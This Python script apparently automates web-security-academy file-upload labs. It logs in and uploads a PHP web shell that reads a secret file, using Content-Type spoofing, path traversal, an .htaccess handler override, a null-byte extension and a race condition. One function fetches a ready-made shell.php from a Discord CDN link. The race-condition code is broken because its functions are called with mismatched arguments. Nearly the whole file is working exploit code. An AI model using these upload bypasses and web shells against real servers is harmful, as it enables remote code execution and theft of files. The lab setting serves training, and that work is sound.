import requests
import sys
import urllib3
from colorama import init, Fore
from bs4 import BeautifulSoup
import random
import string
from requests_toolbelt.multipart.encoder import MultipartEncoder
from concurrent.futures import ThreadPoolExecutor
import threading
import os

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

def csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    return csrf
    
def Remote_code_execution_via_web_shell_upload(s, url):
    path = '/login'
    uri = url + path
    csrf = csrf_token(s, uri)
    r = s.post(uri, data={'csrf':csrf, 'username': 'wiener', 'password': 'peter'}, verify=False, proxies=proxies)
    if r.status_code == 200 and 'Log out' in r.text:
        print(Fore.GREEN + '[+] Successfuly Login to weiner account')
        print(Fore.YELLOW + '[+] Uploading web shell')
        account_url = url + "/my-account"
        upload_url = url + "/my-account/avatar"
        csrf = csrf_token(s, account_url)
        file = {"avatar": ('web-shell.php', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'application/x-php'), "user": "wiener", "csrf": csrf}   
        boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
        files = MultipartEncoder(fields=file, boundary=boundary)
        headers = {'Content-Type': files.content_type}     
        s.post(upload_url, headers=headers, data=files, verify=False, proxies=proxies)
        r = s.get(url + '/files/avatars/web-shell.php', verify=False, proxies=proxies)
        if r.status_code == 200 and "<?php echo file_get_contents('/home/carlos/secret'); ?>" not in r.text:
            print(Fore.GREEN + f'[+] Answer is {r.text}')
            r = s.post(url + '/submitSolution',data={'answer':r.text}, verify=False, proxies=proxies)
            print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
            return True
        else:
            print(Fore.RED +'[-] Unable to get the answer')
            return False 
    else:
        print(Fore.RED +'[-] Unable login to Wiener account')
        return False

def Web_shell_upload_via_Content_Type_restriction_bypass(s, url):
    path = '/login'
    uri = url + path
    csrf = csrf_token(s, uri)
    r = s.post(uri, data={'csrf':csrf, 'username': 'wiener', 'password': 'peter'}, verify=False, proxies=proxies)
    if r.status_code == 200 and 'Log out' in r.text:
        print(Fore.GREEN + '[+] Successfuly Login to weiner account')
        print(Fore.YELLOW + '[+] Uploading web shell')
        account_url = url + "/my-account"
        upload_url = url + "/my-account/avatar"
        csrf = csrf_token(s, account_url)
        file = {"avatar": ('web-shell.php', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'image/png'), "user": "wiener", "csrf": csrf}   
        boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
        files = MultipartEncoder(fields=file, boundary=boundary)
        headers = {'Content-Type': files.content_type}     
        s.post(upload_url, headers=headers, data=files, verify=False, proxies=proxies)
        r = s.get(url + '/files/avatars/web-shell.php', verify=False, proxies=proxies)
        if r.status_code == 200 and "<?php echo file_get_contents('/home/carlos/secret'); ?>" not in r.text:
            print(Fore.GREEN + f'[+] Answer is {r.text}')
            r = s.post(url + '/submitSolution',data={'answer':r.text}, verify=False, proxies=proxies)
            print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
            return True
        else:
            print(Fore.RED +'[-] Unable to get the answer') 
            return False
    else:
        print(Fore.RED +'[-] Unable login to Wiener account')
        return False
    
def Web_shell_upload_via_path_traversal(s, url):
    path = '/login'
    uri = url + path
    csrf = csrf_token(s, uri)
    r = s.post(uri, data={'csrf':csrf, 'username': 'wiener', 'password': 'peter'}, verify=False, proxies=proxies)
    if r.status_code == 200 and 'Log out' in r.text:
        print(Fore.GREEN + '[+] Successfuly Login to weiner account')
        print(Fore.YELLOW + '[+] Uploading web shell')
        account_url = url + "/my-account"
        upload_url = url + "/my-account/avatar"
        csrf = csrf_token(s, account_url)
        file = {"avatar": ('%2e%2e%2fweb-shell.php', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'image/png'), "user": "wiener", "csrf": csrf}   
        boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
        files = MultipartEncoder(fields=file, boundary=boundary)
        headers = {'Content-Type': files.content_type}     
        s.post(upload_url, headers=headers, data=files, verify=False, proxies=proxies)
        r = s.get(url + '/files/web-shell.php', verify=False, proxies=proxies)
        if r.status_code == 200 and "<?php echo file_get_contents('/home/carlos/secret'); ?>" not in r.text:
            print(Fore.GREEN + f'[+] Answer is {r.text}')
            r = s.post(url + '/submitSolution',data={'answer':r.text}, verify=False, proxies=proxies)
            print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
            return True
        else:
            print(Fore.RED +'[-] Unable to get the answer') 
            return False
    else:
        print(Fore.RED +'[-] Unable login to Wiener account')
        return False
    
def Web_shell_upload_via_extension_blacklist_bypass(s, url):
    path = '/login'
    uri = url + path
    csrf = csrf_token(s, uri)
    r = s.post(uri, data={'csrf':csrf, 'username': 'wiener', 'password': 'peter'}, verify=False, proxies=proxies)
    if r.status_code == 200 and 'Log out' in r.text:
        print(Fore.GREEN + '[+] Successfuly Login to weiner account')
        print(Fore.YELLOW + '[+] Uploading web shell')
        account_url = url + "/my-account"
        upload_url = url + "/my-account/avatar"
        csrf = csrf_token(s, account_url)
        files_list = [{"avatar": ('.htaccess', "AddType application/x-httpd-php .shell", 'application/x-php'), "user": "wiener", "csrf": csrf},
                      {"avatar": ('web-shell.shell', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'application/x-php'), "user": "wiener", "csrf": csrf}]
        for file in files_list:
            boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
            files = MultipartEncoder(fields=file, boundary=boundary)
            headers = {'Content-Type': files.content_type}     
            s.post(upload_url, headers=headers, data=files, verify=False, proxies=proxies)
        r = s.get(url + '/files/avatars/web-shell.shell', verify=False, proxies=proxies)
        if r.status_code == 200 and "<?php echo file_get_contents('/home/carlos/secret'); ?>" not in r.text:
            print(Fore.GREEN + f'[+] Answer is {r.text}')
            r = s.post(url + '/submitSolution',data={'answer':r.text}, verify=False, proxies=proxies)
            print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
            return True
        else:
            print(Fore.RED +'[-] Unable to get the answer') 
            return False
    else:
        print(Fore.RED +'[-] Unable login to Wiener account')
        return False

def Web_shell_upload_via_obfuscated_file_extension(s, url):
    path = '/login'
    uri = url + path
    csrf = csrf_token(s, uri)
    r = s.post(uri, data={'csrf':csrf, 'username': 'wiener', 'password': 'peter'}, verify=False, proxies=proxies)
    if r.status_code == 200 and 'Log out' in r.text:
        print(Fore.GREEN + '[+] Successfuly Login to weiner account')
        print(Fore.YELLOW + '[+] Uploading web shell')
        account_url = url + "/my-account"
        upload_url = url + "/my-account/avatar"
        csrf = csrf_token(s, account_url)
        file = {"avatar": ('web-shell.php%00.png', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'image/png'), "user": "wiener", "csrf": csrf}   
        boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
        files = MultipartEncoder(fields=file, boundary=boundary)
        headers = {'Content-Type': files.content_type}     
        s.post(upload_url, headers=headers, data=files, verify=False, proxies=proxies)
        r = s.get(url + '/files/avatars/web-shell.php', verify=False, proxies=proxies)
        if r.status_code == 200 and "<?php echo file_get_contents('/home/carlos/secret'); ?>" not in r.text:
            print(Fore.GREEN + f'[+] Answer is {r.text}')
            r = s.post(url + '/submitSolution',data={'answer':r.text}, verify=False, proxies=proxies)
            print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
            return True
        else:
            print(Fore.RED +'[-] Unable to get the answer') 
            return False
    else:
        print(Fore.RED +'[-] Unable login to Wiener account')
        return False
    
def download_file():
    file_url = "https://cdn.discordapp.com/attachments/848462516433715240/1211396586207187075/shell.php?ex=65ee0bfc&is=65db96fc&hm=5af8050fbc38941816c294183c374e6ab2de74b7c37df9df6ec55c9dce4f0445&"
    response = requests.get(file_url)
    if response.status_code == 200:
        filename = file_url.split("/")[-1].split("?")[0]
        filename = "".join(c for c in filename if c.isalnum() or c in ['.', '_', '-'])
        try:
            with open(filename, "wb") as f:
                f.write(response.content)
            input(Fore.YELLOW + f"[!] First: Login with this credentials wiener:peter\n[!] Second: Upload this file '{Fore.CYAN+os.path.abspath(filename)+Fore.RESET+Fore.YELLOW}' as the avarat then press ENTER:")
        except IndexError as e:
            print(Fore.RED + f'[-] Error {e}')
            return
    else:
        print("Failed to download the file.")

def Remote_code_execution_via_polyglot_web_shell_upload(s, url):
    path = '/login'
    uri = url + path
    csrf = csrf_token(s, uri)
    r = s.post(uri, data={'csrf':csrf, 'username': 'wiener', 'password': 'peter'}, verify=False, proxies=proxies)
    if r.status_code == 200 and 'Log out' in r.text:
        download_file()
        r = s.get(url + '/files/avatars/shell.php', verify=False, proxies=proxies)
        res = r.text
        if r.status_code == 200 and "<?php echo file_get_contents('/home/carlos/secret'); ?>" not in r.text:
            parts = res.split('\n')
            answer = parts[-1].strip()
            print(Fore.GREEN + f'[+] Answer is {answer}')
            r = s.post(url + '/submitSolution',data={'answer':answer}, verify=False, proxies=proxies)
            print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
            return True
        else:
            print(Fore.RED +'[-] Unable to get the answer')
            return False
    else:
        print(Fore.RED +'[-] Unable to log in to Wiener account')
        return False
    
def Web_shell_upload_via_race_condition(s, url):
    path = '/login'
    uri = url + path
    csrf = csrf_token(s, uri)
    r = s.post(uri, data={'csrf':csrf, 'username': 'wiener', 'password': 'peter'}, verify=False, proxies=proxies)
    if r.status_code == 200 and 'Log out' in r.text:
        print(Fore.GREEN + '[+] Successfully logged in to wiener account')
        print(Fore.YELLOW + '[+] Uploading web shell')
    upload_url = url + "/my-account/avatar"
    account_url = url + "/my-account"
    csrf = csrf_token(s, account_url)
    file = {"avatar": ('web-shell.php', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'application/x-php'), "user": "wiener", "csrf": csrf}   
    boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
    files = MultipartEncoder(fields=file, boundary=boundary)
    headers = {'Content-Type': files.content_type}
    s.post(upload_url, headers=headers, data=files, verify=False, proxies=proxies)

def request_avatar(url, s):
    while True:
        r = s.get(url + '/files/avatars/web-shell.php', verify=False, proxies=proxies)
        if r.status_code == 200 and "<?php echo file_get_contents('/home/carlos/secret'); ?>" not in r.text:
            print(Fore.GREEN + f'[+] Answer is {r.text}')
            r = s.post(url + '/submitSolution', data={'answer':r.text}, verify=False, proxies=proxies)
            print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
            return True
        elif r.status_code == 403:
            print(Fore.RED + '[-] Forbidden: Shell is still being scanned')
            return False

def race_condition():
    try:
        if len(sys.argv) != 2:
            print(Fore.YELLOW + "[!] Usage: %s <url>" % sys.argv[0])
            return
    except IndexError as e:
        print(Fore.RED + f'[-] Error {e}')
        return
    
    s = requests.Session()
    url = sys.argv[1]
    account_url = url + "/my-account"
    
    upload_thread = threading.Thread(target=Web_shell_upload_via_race_condition, args=(s, url, account_url))
    request_thread = threading.Thread(target=request_avatar, args=(url, s, proxies))

    upload_thread.start()
    request_thread.start()

    upload_thread.join()
    request_thread.join()
    

        
def main():
    try:
        if len(sys.argv) != 2:
            print(Fore.YELLOW + "[!] Usage: %s <url>" % sys.argv[0])
            return
    except IndexError as e:
        print(Fore.RED + f'[-] Error {e}')
        return
    
    s = requests.Session()
    url = sys.argv[1]
    functions= [
        Remote_code_execution_via_web_shell_upload,
        Web_shell_upload_via_Content_Type_restriction_bypass,
        Web_shell_upload_via_path_traversal,
        Web_shell_upload_via_extension_blacklist_bypass,
        Web_shell_upload_via_obfuscated_file_extension,
        Remote_code_execution_via_polyglot_web_shell_upload,
        race_condition
    ]
    for func in functions:
        os.system('cls')
        if func(s, url) == True:
            print(Fore.GREEN + f'{func.__name__} is working')
            sys.exit(-1)
        else:
            print(Fore.RED + f'{func.__name__} not working ')
        print(Fore.GREEN+'[-] Unable to exploit all the funcs')
if __name__ == "__main__":
    main()